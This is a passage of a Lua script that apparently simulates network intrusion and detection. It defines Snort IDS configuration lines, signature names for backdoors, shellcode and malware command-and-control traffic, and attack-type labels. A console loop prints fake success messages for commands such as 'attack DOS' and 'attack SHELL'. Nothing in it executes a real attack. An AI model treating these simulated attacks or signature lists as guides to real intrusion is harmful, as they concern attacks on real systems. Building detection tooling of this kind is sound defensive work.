Zeroaccess download attempt'}
local myTablec4 = { 'to_client', 'to_server' , 'from_client' , 'from_server' , 'established' , 'not_established' , 'stateless' , 'no_stream' , 'only_stream' , 'only_stream' , 'no_frag', 'only_frag'}
local myTablec55 = { 'uri', 'header', 'cookie' , 'utf8' , 'double_encode' , 'non_ascii' , 'unencode' , 'bare_byte' , 'ascii' , 'iis_encode'}
local myTablec6 = { 'nocase', 'depth', 'offset' , 'distance' , 'within' , 'fast_pattern'}
local myTablec7 = { 'bugtraq', 'cve', 'nessus' , 'arachnids' , 'mcafee' , 'osvdb' , 'msb' , 'url'}
local myTablec8 = { 'engine' , 'soid' , 'service'}
local myTablec9 = { 'attempted-admin' , 'attempted-user' , 'inappropriate-content', 'policy-violation' , 'shellcode-detect' , 'successful-admin' , 'successful-user' , 'trojan-activity' , 'unsuccessful-user' , 'web-application-attack' , 'attempted-dos' , 'attempted-recon', 'bad-unknown' , 'default-login-attempt' , 'denial-of-service' , 'misc-attack' , 'non-standard-protocol' , 'rpc-portmap-decode' , 'successful-dos' , 'successful-recon-largescale' , 'successful-recon-limited', 'suspicious-filename-detect' , 'suspicious-login' ,'system-call-detect' ,'unusual-client-port-connection' ,'web-application-activity' ,'icmp-event' ,'misc-activity' ,'network-scan' ,'not-suspicious' ,'protocol-command-decode' , 'string-detect' , 'unknown_activity' , 'tcp-connection'}

local myTablec10 = {'normal','normal','normal','normal','normal','normal','normal','normal','normal','normal','normal','normal','normal','normal','normal','normal','normal','normal','normal','normal','normal','normal','normal','normal','normal','normal','normal','normal','normal','normal','normal','normal','normal','attempted-admin' , 'attempted-user' , 'inappropriate-content', 'policy-violation' , 'shellcode-detect' , 'successful-admin' , 'successful-user' , 'trojan-activity' , 'unsuccessful-user' , 'web-application-attack' , 'attempted-dos' , 'attempted-recon', 'bad-unknown' , 'default-login-attempt' , 'denial-of-service' , 'misc-attack' , 'non-standard-protocol' , 'rpc-portmap-decode' , 'successful-dos' , 'successful-recon-largescale' , 'successful-recon-limited', 'suspicious-filename-detect' , 'suspicious-login' ,'system-call-detect' ,'unusual-client-port-connection' ,'web-application-activity' ,'icmp-event' ,'misc-activity' ,'network-scan' ,'not-suspicious' ,'protocol-command-decode' , 'string-detect' , 'unknown_activity' , 'tcp-connection'}

local myTableZ = { '@attribute duration','@attribute protocol_type {tcp,udp, icmp} ','@attribute service', '@attribute flag { OTH, REJ, RSTO, RSTOS0, RSTR, S0, S1, S2, S3, SF, SH }' , '@attribute src_bytes REAL' , '@attribute src_bytes SYNTHETIC' , '@attribute dst_bytes real' , '@attribute land {0,1}', '@attribute wrong_fragment REAL' , '@attribute urgent real', '@attribute wrong_fragment SYNTHETIC' , '@attribute hot', '@attribute num_failed_logins real' , '@attribute logged_in {0,1}', '@attribute num_compromised REAL' , '@attribute root_shell', '@attribute su_attempted REAL' , '@attribute num_root', '@attribute num_file creations real' , '@attribute num_shells', '@attribute num_access_files' , '@attribute num_outbound_cmds', '@attribute is_host_login {0,1}' , '@attribute is_guest_login {0,1}' , '@attribute count real' , '@attribute srv_count' , '@attribute serror_rate' , '@attribute srv_serror_rate real' , '@attribute rerror_rate real', '@attribute srv_rerror_rate real', '@attribute same_srv_rate real', '@attribute diff_srv_rate real', '@attribute srv_diff_host real', '@attribute dst_host_count real', '@attribute dst_host_srv_count real', '@attribute dst_host_same_srv_rate real', '@attribute dst_host_diff_srv_rate real', '@attribute dst_host_same_src_port_rate real', '@attribute dst_host_srv_diff_host_rate real', '@attribute dst_host_serror_rate real', '@attribute dst_host_srv_serror_rate real', '@attribute dst_host_rerror_rate real', '@attribute dst_host_srv_rerror_rate real', '@attribute class {normal,anomaly}', '@attribute source_ip', '@attribute source_port', '@attribute destination_ip', '@attribute destination_port', '@attribute transport_layer_protocols {TCP,UDP}', '@attribute SERVICE_ACCESSED (HTTP,FTP,SMTP)', '@attribute NUM_PACKETS_SOURCE_DEST', '@attribute NUM_SEGMENTS_ACK', '@attribute num_bytes_payload', '@attribute num_bytes_payload_retrans', '@attribute num_outof_sequence_segments', '@attribute SYN_count', '@attribute FIN_count', '@attribute average_RTT', '@attribute standard_dev_RTT', '@attribute num_retrans_segments_timeout', '@attribute duration_milli', '@attribute connect_type', '@attribute HTTP_type (GET/POST)' , '@attribute count_src1' , '@attribute count_dest1' , '@attribute count_serv_src1' , '@attribute count_serv_dest1'}

local myTableZX = { 'GET', 'POST'}
local myTableZX2 = { 'bugtraq', 'cve', 'nessus' , 'arachnids' , 'mcafee' , 'osvdb' , 'msb' , 'url'}
local myTableZX3 = { 'ipvar HOME_NET any', 'ipvar EXTERNAL_NET any' , 'ipvar DNS_SERVERS $HOME_NET' , 'ipvar SMTP_SERVERS $HOME_NET' , 'ipvar HTTP_SERVERS $HOME_NET', 'ipvar SQL_SERVERS $HOME_NET' , 'Sipvar TELNET_SERVERS $HOME_NET' , 'ipvar SIP_SERVERS $HOME_NET' , 'ipvar FTP_SERVERS $HOME_NET' , 'ipvar SSH_SERVERS $HOME_NET' , 'ipvar SIP_SERVERS $HOME_NET' , 'portvar HTTP_PORTS [80,81,82,83,84,85,86,87,88,89,90,311,383,591,593,631,901,1220,1414,1741,1830,2301,2381,2809,3037,3057,3128,3702,4343,4848,5250,6080,6988,7000,7001,7144,7145,7510,7777,7779,8000,8008,8014,8028,8080,8085,8088,8090,8118,8123,8180,8181,8222,8243,8280,8300,8500,8800,8888,8899,9000,9060,9080,9090,9091,9443,9999,10000,11371,34443,34444,41080,50002,55555]' , 'portvar SHELLCODE_PORTS !80' , 'portvar ORACLE_PORTS 1024:' , 'portvar SSH_PORTS 22' , 'portvar FTP_PORTS [21,2100,3535]' , 'portvar SIP_PORTS [5060,5061,5600]' , 'portvar FILE_DATA_PORTS [$HTTP_PORTS,110,143]' , 'portvar GTP_PORTS [2123,2152,3386]' , 'ipvar AIM_SERVERS [64.12.24.0/23,64.12.28.0/23,64.12.161.0/24,64.12.163.0/24,64.12.200.0/24,205.188.3.0/24,205.188.5.0/24,205.188.7.0/24,205.188.9.0/24,205.188.153.0/24,205.188.179.0/24,205.188.248.0/24]' , 'var RULE_PATH ../rules' , 'var SO_RULE_PATH ../so_rules' , 'var PREPROC_RULE_PATH ../preproc_rules' , 'var WHITE_LIST_PATH ../rules' , 'var BLACK_LIST_PATH ../rules' , 'config disable_decode_alerts' , 'config disable_tcpopt_experimental_alerts' , 'config disable_tcpopt_obsolete_alerts ' , 'config disable_tcpopt_ttcp_alerts' , 'config disable_tcpopt_alerts' , 'config disable_ipopt_alerts' , 'config enable_decode_oversized_alerts', 'config enable_decode_oversized_drops' , 'config checksum_mode: all' , 'config flowbits_size: 64' , 'config ignore_ports: tcp 21 6667:6671 1356', 'config ignore_ports: udp 1:17 53' , 'config response: eth0 attempts 2' , '<type> ::= pcap | afpacket | dump | nfq | ipq | ipfw' , 'config daq: <type>' , 'config daq_mode: <mode>' , 'config daq_dir: <dir>' , 'config daq_var: <var>' , '<mode> ::= read-file | passive | inline' , '<var> ::= arbitrary <name>=<value passed to DAQ' , '<dir> ::= path as to where to look for DAQ module' , 'config set_gid:' , 'config set_uid:' , 'config snaplen:' , 'config bpf_file:' , 'config logdir:' , 'config pcre_match_limit: 3500' , 'config detection: search-method ac-split search-optimize max-pattern-len 20' , 'config event_queue: max_queue 8 log 5 order_events content_length' , 'config enable_gtp' , 'config ppm: max-pkt-time 250, /fastpath-expensive-packets, /pkt-log' , 'config ppm: max-rule-time 200, /threshold 3, /suspend-expensive-rules, /suspend-timeout 20, /rule-log alert' , 'config profile_rules: print all, sort avg_ticks' , 'config profile_preprocs: print all, sort avg_ticks' , 'config paf_max: 16000' , 'dynamicpreprocessor directory /usr/local/lib/snort_dynamicpreprocessor/' , 'dynamicengine /usr/local/lib/snort_dynamicengine/libsf_engine.so' , 'dynamicdetection directory /usr/local/lib/snort_dynamicrules' , 'preprocessor gtp: ports { 2123 3386 2152 }' , 'preprocessor normalize_ip4' , 'preprocessor normalize_tcp: ips ecn stream' , 'preprocessor normalize_icmp4' , 'preprocessor normalize_ip6' ,'preprocessor normalize_icmp6' ,'preprocessor frag3_global: max_frags 65536' ,'preprocessor frag3_engine: policy windows detect_anomalies overlap_limit 10 ' ,'min_fragment_length 100 timeout 180' ,'preprocessor stream5_global: track_tcp yes, /track_udp yes, /track_icmp no, /max_tcp 262144, /max_udp 131072, /max_active_responses 2, /min_response_seconds 5' ,'preprocessor stream5_tcp: policy windows, detect_anomalies, require_3whs 180, /overlap_limit 10, small_segments 3 bytes 150, timeout 180, /ports client 21 22 23 25 42 53 70 79 109 110 111 113 119 135 136 137 139 143 /161 445 513 514 587 593 691 1433 1521 1741 2100 3306 6070 6665 6666 6667 6668 6669 /7000 8181 32770 32771 32772 32773 32774 32775 32776 32777 32778 32779, /ports both 80 81 82 83 84 85 86 87 88 89 90 110 311 383 443 465 563 591 593 631 636 901 989 992 993 994 995 1220 1414 1830 2301 2381 2809 3037 3057 3128 3702 4343 4848 5250 6080 6988 7907 7000 7001 7144 7145 7510 7802 7777 7779 /7801 7900 7901 7902 7903 7904 7905 7906 7908 7909 7910 7911 7912 7913 7914 7915 7916 /7917 7918 7919 7920 8000 8008 8014 8028 8080 8085 8088 8090 8118 8123 8180 8222 8243 8280 8300 8500 8800 8888 8899 9000 9060 9080 9090 9091 9443 9999 10000 11371 34443 34444 41080 50002 55555' ,'preprocessor stream5_udp: timeout 180' ,'preprocessor perfmonitor: time 300 file /var/snort/snort.stats pktcnt 10000' ,'http_methods { GET POST PUT SEARCH MKCOL COPY MOVE LOCK UNLOCK NOTIFY POLL BCOPY BDELETE BMOVE LINK UNLINK OPTIONS HEAD DELETE TRACE TRACK CONNECT SOURCE SUBSCRIBE UNSUBSCRIBE PROPFIND PROPPATCH BPROPFIND BPROPPATCH RPC_CONNECT PROXY_SUCCESS BITS_POST CCM_POST SMS_POST RPC_IN_DATA RPC_OUT_DATA RPC_ECHO_DATA }' ,'chunk_length 500000', 'server_flow_depth 0' , 'client_flow_depth 0' , 'post_depth 65495' , 'oversize_dir_length 500' , 'max_header_length 750' , 'max_headers 100' , 'max_spaces 200' , 'small_chunk_length { 10 5 }' , 'ports { 80 81 82 83 84 85 86 87 88 89 90 311 383 591 593 631 901 1220 1414 1741 1830 2301 2381 2809 3037 3057 3128 3702 4343 4848 5250 6080 6988 7000 7001 7144 7145 7510 7777 7779 8000 8008 8014 8028 8080 8085 8088 8090 8118 8123 8180 8181 8222 8243 8280 8300 8500 8800 8888 8899 9000 9060 9080 9090 9091 9443 9999 10000 11371 34443 34444 41080 50002 55555 }' , 'non_rfc_char { 0x00 0x01 0x02 0x03 0x04 0x05 0x06 0x07 }' ,' enable_cookie' ,'extended_response_inspection' ,'inspect_gzip' ,'normalize_utf ' ,'unlimited_decompress' ,'normalize_javascript' ,'apache_whitespace no' ,'ascii no' ,'bare_byte no' ,'directory no' ,'double_decode no' , 'iis_backslash no' , 'preprocessor rpc_decode: 111 32770 32771 32772 32773 32774 32775 32776 32777 32778 32779 no_alert_multiple_requests no_alert_large_fragments no_alert_incomplete' , 'iis_delimiter no' , 'iis_unicode no' , 'utf_8 no' , 'multi_slash no' , 'u_encode yes' , 'webroot no' , 'preprocessor bo' ,'preprocessor ftp_telnet: global inspection_type stateful encrypted_traffic no check_encrypted' ,'preprocessor ftp_telnet_protocol: telnet preprocessor ftp_telnet_protocol: telnet /ayt_attack_thresh 20 /normalize ports { 23 } /detect_anomalies' ,'preprocessor ftp_telnet_protocol: ftp server default/def_max_param_len 100 /ports { 21 2100 3535 } /telnet_cmds yes /ignore_telnet_erase_cmds yes /ftp_cmds { ABOR ACCT ADAT ALLO APPE AUTH CCC CDUP } /ftp_cmds { CEL CLNT CMD CONF CWD DELE ENC EPRT } /ftp_cmds { EPSV ESTA ESTP FEAT HELP LANG LIST LPRT } /ftp_cmds { LPSV MACB MAIL MDTM MIC MKD MLSD MLST } /ftp_cmds { MODE NLST NOOP OPTS PASS PASV PBSZ PORT } /ftp_cmds { PROT PWD QUIT REIN REST RETR RMD RNFR } /ftp_cmds { RNTO SDUP SITE SIZE SMNT STAT STOR STOU } /ftp_cmds { STRU SYST TEST TYPE USER XCUP XCRC XCWD } /ftp_cmds { XMAS XMD5 XMKD XPWD XRCP XRMD XRSQ XSEM } /ftp_cmds { XSEN XSHA1 XSHA256 } /alt_max_param_len 0 { ABOR CCC CDUP ESTA FEAT LPSV NOOP PASV PWD QUIT REIN ' ,'STOU SYST XCUP XPWD } /alt_max_param_len 200 { ALLO APPE CMD HELP NLST RETR RNFR STOR STOU XMKD } /alt_max_param_len 256 { CWD RNTO } /alt_max_param_len 400 { PORT } /alt_max_param_len 512 { SIZE } /chk_str_fmt { ACCT ADAT ALLO APPE AUTH CEL CLNT CMD } /chk_str_fmt { CONF CWD DELE ENC EPRT EPSV ESTP HELP } /chk_str_fmt { LANG LIST LPRT MACB MAIL MDTM MIC MKD } /chk_str_fmt { MLSD MLST MODE NLST OPTS PASS PBSZ PORT } /chk_str_fmt { PROT REST RETR RMD RNFR RNTO SDUP SITE } /chk_str_fmt { SIZE SMNT STAT STOR STRU TEST TYPE USER } /chk_str_fmt { XCRC XCWD XMAS XMD5 XMKD XRCP XRMD XRSQ } / chk_str_fmt { XSEM XSEN XSHA1 XSHA256 } /cmd_validity ALLO < int [ char R int ] > /    cmd_validity EPSV < [ { char 12 | char A char L char L } ] > /cmd_validity MACB < string > /cmd_validity MDTM < [ date nnnnnnnnnnnnnn[.n[n[n]]] ] string > /cmd_validity MODE < char ASBCZ > /cmd_validity PORT < host_port > /cmd_validity PROT < char CSEP > /cmd_validity STRU < char FRPO [ string ] > / cmd_validity TYPE < { char AE [ char NTC ] | char I | char L [ number ] } >' ,'preprocessor ftp_telnet_protocol: ftp client default /max_resp_len 256 /bounce yes /ignore_telnet_erase_cmds yes /telnet_cmds yes' ,'preprocessor smtp: ports { 25 465 587 691 } /inspection_type stateful /b64_decode_depth 0 /qp_decode_depth 0 /bitenc_decode_depth 0 /uu_decode_depth 0 /log_mailfrom /log_rcptto /log_filename /log_email_hdrs /normalize cmds /normalize_cmds { ATRN AUTH BDAT CHUNKING DATA DEBUG EHLO EMAL ESAM ESND ESOM ETRN EVFY } /normalize_cmds { EXPN HELO HELP IDENT MAIL NOOP ONEX QUEU QUIT RCPT RSET SAML SEND SOML } /normalize_cmds { STARTTLS TICK TIME TURN TURNME VERB VRFY X-ADAT X-DRCP X-ERCP X-EXCH50 } /normalize_cmds { X-EXPS X-LINK2STATE XADR XAUTH XCIR XEXCH50 XGEN XLICENSE XQUE XSTA XTRN XUSR } /max_command_line_len 512 /max_header_line_len 1000 /max_response_line_len 512 /alt_max_command_line_len 260 { MAIL } /alt_max_command_line_len 300 { RCPT } /alt_max_command_line_len 500 { HELP HELO ETRN EHLO } /alt_max_command_line_len 255 { EXPN VRFY ATRN SIZE BDAT DEBUG EMAL ESAM ESND ESOM EVFY IDENT NOOP RSET } /alt_max_command_line_len 246 { SEND SAML SOML AUTH TURN ETRN DATA RSET QUIT ONEX QUEU STARTTLS TICK TIME TURNME VERB X-EXPS X-LINK2STATE XADR XAUTH XCIR XEXCH50 XGEN XLICENSE XQUE XSTA XTRN XUSR } /valid_cmds { ATRN AUTH BDAT CHUNKING DATA DEBUG EHLO EMAL ESAM ESND ESOM ETRN EVFY } / valid_cmds { EXPN HELO HELP IDENT MAIL NOOP ONEX QUEU QUIT RCPT RSET SAML SEND SOML } /valid_cmds { STARTTLS TICK TIME TURN TURNME VERB VRFY X-ADAT X-DRCP X-ERCP X-EXCH50 } /valid_cmds { X-EXPS X-LINK2STATE XADR XAUTH XCIR XEXCH50 XGEN XLICENSE XQUE XSTA XTRN XUSR } /xlink2state { enabled }' ,'preprocessor sfportscan: proto  { all } memcap { 10000000 } sense_level { low }' ,'preprocessor arpspoof' ,'preprocessor arpspoof_detect_host: 192.168.40.1 f0:0f:00:f0:0f:00' ,'preprocessor ssh: server_ports { 22 } /autodetect /max_client_bytes 19600 /max_encrypted_packets 20 /max_server_version_len 100 /enable_respoverflow enable_ssh1crc32 /enable_srvoverflow enable_protomismatch','preprocessor dcerpc2: memcap 102400, events [co ]' , 'preprocessor dcerpc2_server: default, policy WinXP, /detect [smb [139,445], tcp 135, udp 135, rpc-over-http-server 593], /autodetect [tcp 1025:, udp 1025:, rpc-over-http-server 1025:], /smb_max_chain 3, smb_invalid_shares ["C$", "D$", "ADMIN$"]' , 'preprocessor dns: ports { 53 } enable_rdata_overflow' , 'preprocessor ssl: ports { 443 465 563 636 989 992 993 994 995 7801 7802 7900 7901 7902 7903 7904 7905 7906 7907 7908 7909 7910 7911 7912 7913 7914 7915 7916 7917 7918 7919 7920 }, trustservers, noinspect_encrypted' , 'preprocessor sensitive_data: alert_threshold 25' , 'preprocessor sip: max_sessions 40000, /ports { 5060 5061 5600 }, /methods { invite /cancel /ack /bye /register /options /refer /subscribe /update /join/info /message /notify /benotify /do /qauth /sprack /publish /service /unsubscribe /prack }, /max_uri_len 512, /max_call_id_len 80, /max_requestName_len 20, /max_from_len 256, /max_to_len 256, /max_via_len 1024, /max_contact_len 512, /max_content_len 2048' , 'preprocessor imap: /ports { 143 } /b64_decode_depth 0 /qp_decode_depth 0 /bitenc_decode_depth 0 /uu_decode_depth 0' , 'preprocessor pop: /ports { 110 } /b64_decode_depth 0 /qp_decode_depth 0 /bitenc_decode_depth 0 /uu_decode_depth 0' , 'preprocessor modbus: ports { 502 }' , 'preprocessor dnp3: ports { 20000 } /memcap 262144 /check_crc' ,'preprocessor reputation: /memcap 500, /priority whitelist, /nested_ip inner, /whitelist $WHITE_LIST_PATH/white_list.rules, /blacklist $BLACK_LIST_PATH/black_list.rules' ,'output unified2: filename merged.log, limit 128, nostamp, mpls_event_types, vlan_event_types' ,'output alert_unified2: filename snort.alert, limit 128, nostamp' ,'output log_unified2: filename snort.log, limit 128, nostamp' ,'include classification.config' ,'output alert_syslog: LOG_AUTH LOG_ALERT' ,'output log_tcpdump: tcpdump.log' ,'include reference.config' ,'include $PREPROC_RULE_PATH/preprocessor.rule' ,'include $PREPROC_RULE_PATH/decoder.rules','include $PREPROC_RULE_PATH/sensitive-data.rules' , 'include $RULE_PATH/local.rules' , 'include $RULE_PATH/app-detect.rules' , 'include $RULE_PATH/attack-responses.rules' , 'include $RULE_PATH/backdoor.rules' , 'include $RULE_PATH/bad-traffic.rules' , 'include $RULE_PATH/blacklist.rules' , 'include $RULE_PATH/botnet-cnc.rules' , 'include $RULE_PATH/browser-chrome.rules' , 'include $RULE_PATH/browser-firefox.rules' ,'include $RULE_PATH/browser-ie.rules' ,'event_filter gen_id 1, sig_id 1851, type limit' ,'event_filter gen_id 0, sig_id 0, type limit, track by_src, count 1, seconds 60' ,'suppress gen_id 1, sig_id 1852' ,'suppress gen_id 1, sig_id 1852, track by_src, ip 10.1.1.54' ,'suppress gen_id 1, sig_id 1852, track by_dst, ip 10.1.1.0/24' ,'event_filter gen_id 0, sig_id 0, type limit, track by_src, count 1, seconds 60' ,'config reference: bugtraq   http://www.securityfocus.com/bid/ ' ,'config reference: cve       http://cve.mitre.org/cgi-bin/cvename.cgi?name=' ,'config reference: arachNIDS http://www.whitehats.com/info/IDS','config reference: osvdb	    http://osvdb.org/show/osvdb/' , 'config reference: McAfee   http://vil.nai.com/vil/content/v_' , 'config reference: nessus    http://cgi.nessus.org/plugins/dump.php3?id=' , 'config reference: url http://' , 'config reference: msb       http://technet.microsoft.com/en-us/security/bulletin/' , 'config classification: not-suspicious,Not Suspicious Traffic,3' , 'config classification: unknown,Unknown Traffic,3' , 'config classification: bad-unknown,Potentially Bad Traffic, 2' , 'config classification: attempted-recon,Attempted Information Leak,2' , 'config classification: successful-recon-limited,Information Leak,2' ,'config classification: successful-recon-largescale,Large Scale Information Leak,2' ,'config classification: attempted-dos,Attempted Denial of Service,2' ,'config classification: successful-dos,Denial of Service,2' ,'config classification: attempted-user,Attempted User Privilege Gain,1' ,'config classification: unsuccessful-user,Unsuccessful User Privilege Gain,1' ,'config classification: successful-user,Successful User Privilege Gain,1' ,'config classification: attempted-admin,Attempted Administrator Privilege Gain,1' ,'config classification: successful-admin,Successful Administrator Privilege Gain,1' ,'config classification: rpc-portmap-decode,Decode of an RPC Query,2' ,'config classification: shellcode-detect,Executable Code was Detected,1','config classification: string-detect,A Suspicious String was Detected,3' , 'config classification: suspicious-filename-detect,A Suspicious Filename was Detected,2' , 'config classification: suspicious-login,An Attempted Login Using a Suspicious Username was Detected,2' , 'config classification: system-call-detect,A System Call was Detected,2' , 'config classification: tcp-connection,A TCP Connection was Detected,4' , 'config classification: trojan-activity,A Network Trojan was Detected, 1' , 'config classification: unusual-client-port-connection,A Client was Using an Unusual Port,2' , 'config classification: network-scan,Detection of a Network Scan,3' , 'config classification: denial-of-service,Detection of a Denial of Service Attack,2' , 'config classification: non-standard-protocol,Detection of a Non-Standard Protocol or Event,2' ,'config classification: protocol-command-decode,Generic Protocol Command Decode,3' ,'config classification: web-application-activity,Access to a Potentially Vulnerable Web Application,2' ,'config classification: web-application-attack,Web Application Attack,1' ,'config classification: misc-activity,Misc activity,3' ,'config classification: misc-attack,Misc Attack,2' ,'config classification: icmp-event,Generic ICMP event,3' ,'config classification: inappropriate-content,Inappropriate Content was Detected,1' ,'config classification: policy-violation,Potential Corporate Privacy Violation,1' ,'config classification: default-login-attempt,Attempt to Login By a Default Username and Password,2' ,'config classification: sdf,Sensitive Data was Transmitted Across the Network,2','config classification: file-format,Known malicious file or file based exploit,1' , 'config classification: malware-cnc,Known malware command and control traffic,1' , 'config classification: client-side-exploit,Known client side exploit attempt,1' , 'include $RULE_PATH/browser-other.rules' , 'include $RULE_PATH/browser-plugins.rules' , 'include $RULE_PATH/browser-webkit.rules' , 'include $RULE_PATH/chat.rules' , 'include threshold.conf' , 'include $SO_RULE_PATH/web-misc.rules' , 'include $SO_RULE_PATH/web-iis.rules' ,'include $SO_RULE_PATH/web-activex.rules' ,'include $SO_RULE_PATH/specific-threats.rules' ,'include $SO_RULE_PATH/snmp.rules' ,'include $SO_RULE_PATH/multimedia.rules' ,'include $SO_RULE_PATH/imap.rules' ,'include $SO_RULE_PATH/exploit.rules' ,'include $SO_RULE_PATH/icmp.rules' ,'include $SO_RULE_PATH/bad-traffic.rule'}


local myTableBB = { 'GET', 'POST'}
local myTable2BB = { 'bugtraq', 'cve', 'nessus' , 'arachnids' , 'mcafee' , 'osvdb' , 'msb' , 'url'}
local myTable3BB = { 'MALWARE-BACKDOOR - Dagger_1.4.0', 'PROTOCOL-ICMP Mobile Registration Reply' , 'INDICATOR-SHELLCODE Oracle sparc setuid 0' , 'INDICATOR-SHELLCODE sparc NOOP' , 'SERVER-MAIL Sendmail 5.5.5 exploit', 'SERVER-OTHER Adobe Coldfusion db connections flush attempt' , 'SERVER-IIS bdir access' , 'SERVER-WEBAPP carbo.dll access' , 'SERVER-IIS cmd.exe access' , 'SERVER-ORACLE EXECUTE_SYSTEM attempt' , 'SERVER-OTHER LPD dvips remote command execution attempt' , 'OS-WINDOWS DCERPC Messenger Service buffer overflow attempt' , 'PROTOCOL-RPC sadmind query with root credentials attempt UDP' , 'OS-WINDOWS SMB-DS DCERPC Messenger Service buffer overflow attempt' , 'SERVER-MAIL VRFY overflow attempt' , 'SERVER-WEBAPP PhpGedView PGV functions.php base directory manipulation attempt' , 'MALWARE-CNC DoomJuice/mydoom.a backdoor upload/execute' , 'SERVER-OTHER ISAKMP first payload certificate request length overflow attempt' , 'NETBIOS NS lookup short response attempt' , 'FILE-IMAGE JPEG parser multipacket heap overflow' , 'SERVER-ORACLE dbms_offline_og.end_instantiation buffer overflow attempt' , 'APP-DETECT Absolute Software Computrace outbound connection' , 'MALWARE-CNC Daws Trojan Outbound Plaintext over SSL Port' , 'BLACKLIST DNS request for known malware domain' , 'EXPLOIT-KIT Nuclear exploit kit Spoofed Host Header .com- requests' , 'EXPLOIT-KIT DotCachef/DotCache exploit kit Zeroaccess download attempt' , 'FILE-OTHER Oracle Java font rendering remote code execution attempt' , 'FILE-OFFICE Microsoft Office Excel style handling overflow attempt ' , 'SCADA Schneider Electric IGSS integer underflow attempt' , 'BLACKLIST User-Agent known malicious user agent - spam_bot' , 'DELETED FILE-IDENTIFY MIME file type file download request'}

local myTablexBB = { 'url,www.virustotal.com/file/', 'url,en.wikipedia.org/wiki/PostScript_fonts#Compact_Font_Format' , 'url,en.wikipedia.org/wiki/MIME' , 'url,www.virustotal.com/file-scan/report.html?id=3089f01c9893116ac3ba54f6661020203e4c1ea72d04153af4a072253fcf9e68-1314531539' , 'url,technet.microsoft.com/en-us/security/bulletin/MS09-021', 'url,www.virustotal.com/file-scan/report.html?id=7c6df3935657357ac8c8217872d19845bbd3321a1daf9165cdec6d72a0127dab-1225232595' , 'url,asert.arbornetworks.com/2011/08/dirt-jumper-caught/' , 'url,www.f-secure.com/weblog/archives/00002227.html' , 'url,labs.snort.org/docs/18370.html' , 'url,technet.microsoft.com/en-us/security/advisory/953839' , 'url,en.wikipedia.org/wiki/Microsoft_access' , 'url,technet.microsoft.com/en-us/security/bulletin/ms03-039' , 'url,technet.microsoft.com/en-us/security/bulletin/MS06-070' , 'url,www3.ca.com/securityadvisor/pest/pest.aspx?id=453075851' , 'url,www.2-seek.com/toolbar.php' , 'url,technet.microsoft.com/en-us/security/bulletin/MS06-042' , 'url,www3.ca.com/securityadvisor/pest/pest.aspx?id=453090405' , 'url,www.spywareguide.com/product_show.php?id=651' , 'url,www.eeye.com/html/Research/Advisories/AD20040226.html' , 'url,msdn.microsoft.com/library/default.asp?url=/library/en-us/shutdown/base/initiatesystemshutdown.asp' , 'url,technet.microsoft.com/en-us/security/bulletin/ms00-040' , 'url,technet.microsoft.com/en-us/security/bulletin/ms05-010' , 'url,technet.microsoft.com/en-us/security/advisory/911052' , 'url,technet.microsoft.com/en-us/security/bulletin/ms05-047' , 'url,en.wikipedia.org/wiki/.ram' , 'url,www.isi.edu/in-notes/rfc1122.txt' , 'url,www.wiretrip.net/rfp/pages/whitepapers/whiskerids.html' , }

myattackx1 = {'malware' }
myattackx2 = {'brute_force'}
myattackx3 = {'dos_attack'}
myattackx4 = {'sql_inject'}
 myattackx5 = {'xss'}
 myattackx6 = {'hijack'}
myattackx7 = {'arp_spoof'}
myattackx8 = {'ldap'}
 myattackx9 = {'xpath'}
myattackx10 = {'bufferoverflow'}
myattackx11 = {'file_inclusion'}
 myattackx12 = {'csrf'}
 myattackx13 = {'directory_traversal'}
myattackx14 = {'probe'}
 myattackx15 = {'masquerade'}




repeat
 io.write("\nB:/> ")

   io.flush()
  
   local tWords = {}
   s = io.read()

   
words = {}
for word in s:gmatch("%w+") do table.insert(words, word) end
    
 if words[1]=="attack" or words[1]=="ATTACK" then
   if paxname>=10 then
     if words[2]=="DOS" then

           if tonumber(words[3])~=nill then
             if tonumber(words[4])~=nill and tonumber(words[5])~=nill and tonumber(words[6])~=nill and string.len(words[6])==1 and words[7]==nill then
              io.write("A denial-of-service attack on " .. words[3] .. "." .. words[4] .. "." .. words[5] .. "." .. words[6] .. " was made successfully") 
              zdos = zdos + 1
              p1 = words[3]
              p2 = words[4]
              p3 = words[5]
              p4 = words[6]
              
              if ((p1==hostip1 and p2==hostip2 and p3==hostip3 and p4==hostip4) or (p1==hostip5 and p2==hostip6 and p3==hostip7 and p4==hostip8) or (p1==hostip9 and p2==hostip10 and p3==hostip11 and p4==hostip12) or (p1==hostip13 and p2==hostip14 and p3==hostip15 and p4==hostip16) or (p1==hostip17 and p2==hostip18 and p3==hostip19 and p4==hostip20) or (p1==hostip21 and p2==hostip22 and p3==hostip23 and p4==hostip24)) and digdi==0 then
              z = z + 1
              genmal = genmal + math.random(8000,10000)
              gen = gen + math.random(600,150000) 
              genmala = genmal
               
               
              end
              else
                io.write("Wrong parameters were entered")
               end
              
            else
              io.write("You have not specified a destination for DOS attack.")  
            end
       
    
     elseif words[2]=="SHELL" then

           if tonumber(words[3])~=nill then
             if tonumber(words[4])~=nill and tonumber(words[5])~=nill and tonumber(words[6])~=nill and words[7]==nill then
             io.write("A shellcode execution on " .. words[3] .. "." .. words[4] .. "." .. words[5] .. "." .. words[6] .. " was made successfully") 
             zshell = zshell + 1
              m1 = words[3]
              m2 = words[4]
              m3 = words[5]
              m4 = words[6]
              
              if ((m1==hostip1 and m2==hostip2 and m3==hostip3 and m4==hostip4) or (m1==hostip5 and m2==hostip6 and m3==hostip7 and m4==hostip8) or (m1==hostip9 and m2==hostip10 and m3==hostip11 and m4==hostip12) or (m1==hostip13 and m2==hostip14 and m3==hostip15 and m4==hostip16) or (m1==hostip17 and m2==hostip18 and m3==hostip19 and m4==hostip20) or (m1==hostip21 and m2==hostip22 and m3==hostip23 and m4==hostip24)) and digdi==0  then
              m = m + 1
             genmal = genmal + math.random(800,1000) 
                 gen = gen + math.random(600,1500) 
      genmalb = genmal
               end
               
               else
                io.write("Wrong parameters were entered")
               end
               
            else
              io.write("You have not specified a destination for shellcode execution.")  
            end
    
     elseif words[2]=="REMBUFF" then

           if tonumber(words[3])~=nill then
             if tonumber(words[4])~=nill and tonumber(words[5])~=nill and tonumber(words[6])~=nill and words[7]==nill then
             io.write("A remote bufferoverflow attack on " .. words[3] .. "." .. words[4] .. "." .. words[5] .. "." .. words[6] .. " was made successfully") 
              zbuff = zbuff + 1
              x1 = words[3]
              x2 = words[4]
              x3 = words[5]
              x4 = words[6]
              
